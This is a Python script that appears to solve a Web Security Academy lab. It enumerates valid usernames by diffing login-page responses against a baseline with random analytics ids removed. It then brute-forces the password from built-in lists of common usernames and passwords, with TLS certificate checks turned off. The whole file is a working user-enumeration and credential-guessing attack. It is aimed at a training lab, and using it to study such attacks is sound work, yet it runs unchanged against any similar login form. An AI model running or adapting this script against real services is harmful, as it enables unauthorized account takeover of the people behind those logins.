import http.client
import ssl
import re
import myers

LAB_ID = "???"

def POST_login(
        username: str,
        password: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    body = f'username={username}&password={password}'
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def is_username_valid(username: str):
    return """username" autofocus""" not in POST_login(username, 'password').read().decode('utf-8')


def is_password_valid(username: str, password: str):
    response = POST_login(username, password)
    return 'Invalid' not in response.read().decode('utf-8')


def difference(resp1: str, resp2: str) -> float:
    diff = myers.diff(resp1, resp2, context=None, format=None)
    return len([x for x in diff if x[0] != 'k'])

def remove_randomness(resp: str) -> str:
    result = resp.replace('<!-- -->', '')
    result = re.sub(r'analytics\?id=[0-9]+\'', '', result)
    return result

usernames = ['carlos', 'root', 'admin', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle',
             'ftp', 'pi', 'puppet', 'ansible', 'ec2-user', 'vagrant', 'azureuser', 'academico', 'acceso', 'access',
             'accounting', 'accounts', 'acid', 'activestat', 'ad', 'adam', 'adkit', 'admin', 'administracion',
             'administrador', 'administrator', 'administrators', 'admins', 'ads', 'adserver', 'adsl', 'ae', 'af',
             'affiliate', 'affiliates', 'afiliados', 'ag', 'agenda', 'agent', 'ai', 'aix', 'ajax', 'ak', 'akamai', 'al',
             'alabama', 'alaska', 'albuquerque', 'alerts', 'alpha', 'alterwind', 'am', 'amarillo', 'americas', 'an',
             'anaheim', 'analyzer', 'announce', 'announcements', 'antivirus', 'ao', 'ap', 'apache', 'apollo', 'app',
             'app01', 'app1', 'apple', 'application', 'applications', 'apps', 'appserver', 'aq', 'ar', 'archie',
             'arcsight', 'argentina', 'arizona', 'arkansas', 'arlington', 'as', 'as400', 'asia', 'asterix', 'at',
             'athena', 'atlanta', 'atlas', 'att', 'au', 'auction', 'austin', 'auth', 'auto', 'autodiscover']
passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon',
             '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666',
             'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777',
             '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh',
             'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000',
             'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george',
             'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom',
             '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda',
             'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321',
             'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana',
             'moon', 'moscow']
valid_username = None # set when you find response with the most significant diff
model_response = remove_randomness(POST_login('xxx', 'xxx').read().decode('utf-8'))
if valid_username is None:
    for username in usernames:
        response = POST_login(username, 'xxx')
        diff = difference(model_response, remove_randomness(response.read().decode('utf-8')))
        print(f'diff: {diff},\tusername: {username}\t')


if valid_username is not None:
    for password in passwords:
        print(f'trying {valid_username}:{password}')
        if is_password_valid(valid_username, password):
            print(f'For username {valid_username} found valid password: {password}')
            break
    else:
        print(f'For username {valid_username} could not find valid password')
